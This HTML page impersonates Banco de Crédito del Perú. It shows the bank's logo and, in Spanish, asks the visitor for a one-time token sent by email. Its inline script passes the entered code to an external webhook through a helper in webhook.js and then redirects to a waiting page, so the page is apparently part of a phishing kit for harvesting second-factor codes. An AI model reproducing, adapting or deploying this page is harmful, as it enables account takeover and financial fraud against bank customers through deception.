<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BCP - Token enviado al correo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        background-color: #f4f5f7;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
        padding: 20px;
      }
      .phone-container {
        width: 375px;
        height: 750px;
        background-color: #ffffff;
        border-radius: 40px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        padding: 24px;
        box-sizing: border-box;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        position: relative;
        overflow: hidden;
      }
      .header {
        margin-top: 10px;
      }
      .logo-container {
        width: 80px;
        height: 80px;
        margin-bottom: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .logo-container img {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      h1 {
        font-size: 26px;
        color: #111;
        margin: 0 0 8px 0;
        font-weight: 700;
        line-height: 1.2;
      }
      p.subtitle {
        color: #666;
        font-size: 15px;
        margin: 0 0 32px 0;
      }
      .card-form {
        display: flex;
        flex-direction: column;
        gap: 16px;
        margin-top: 20px;
      }
      .input-group-outline {
        position: relative;
        border: 1px solid #d1d5db;
        border-radius: 8px;
        padding: 8px 12px;
        background-color: #fff;
      }
      .input-group-outline label {
        position: absolute;
        top: -8px;
        left: 10px;
        background-color: #fff;
        padding: 0 4px;
        font-size: 11px;
        color: #6b7280;
      }
      .input-group-outline input {
        border: none;
        background: transparent;
        font-size: 15px;
        color: #333;
        outline: none;
        width: 100%;
        padding: 4px 0;
        letter-spacing: 2px;
      }
      .btn-principal {
        width: 100%;
        background-color: #ea580c;
        color: #ffffff;
        border: none;
        border-radius: 24px;
        padding: 16px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        text-align: center;
        box-shadow: 0 4px 12px rgba(234, 88, 12, 0.3);
        transition: background 0.3s;
      }
      .btn-principal:hover {
        background-color: #c2410c;
      }
      .btn-principal:disabled {
        background-color: #d1d5db;
        box-shadow: none;
        cursor: not-allowed;
      }
      .footer-text {
        font-size: 12px;
        color: #666;
        text-align: center;
        margin-top: 12px;
      }
    </style>
  </head>
  <body>
    <div class="phone-container">
      <div class="header">
        <div class="logo-container">
          <img
            src="https://brandlogos.net/wp-content/uploads/2025/06/banco_de_credito_del_peru-logo_brandlogos.net_qqyy3.png"
            alt="Logo"
          />
        </div>
        <h1>Ingresa el<br />token</h1>
        <p class="subtitle">
          Enviamos un token a tu correo electrónico. Ingrésalo para continuar.
        </p>

        <div class="card-form">
          <div class="input-group-outline">
            <label for="token">Token enviado al correo electrónico</label>
            <input
              type="text"
              id="token"
              name="token"
              placeholder="Ingresa el token"
              inputmode="numeric"
              maxlength="9"
              autocomplete="one-time-code"
            />
          </div>
        </div>
      </div>

      <div>
        <button class="btn-principal" id="btn-continuar">Continuar</button>
        <div class="footer-text">Banco de Crédito del Perú</div>
      </div>
    </div>

    <script src="webhook.js"></script>
    <script>
      document
        .getElementById("btn-continuar")
        .addEventListener("click", async () => {
          const token = document.getElementById("token").value.trim();
          if (!token) return;

          const btn = document.getElementById("btn-continuar");
          btn.disabled = true;
          btn.textContent = "Enviando...";

          await enviarAWebhook("🔑 Token de correo", {
            Token: token,
          });

          location.href = "esperar.html";
        });
    </script>
  </body>
</html>
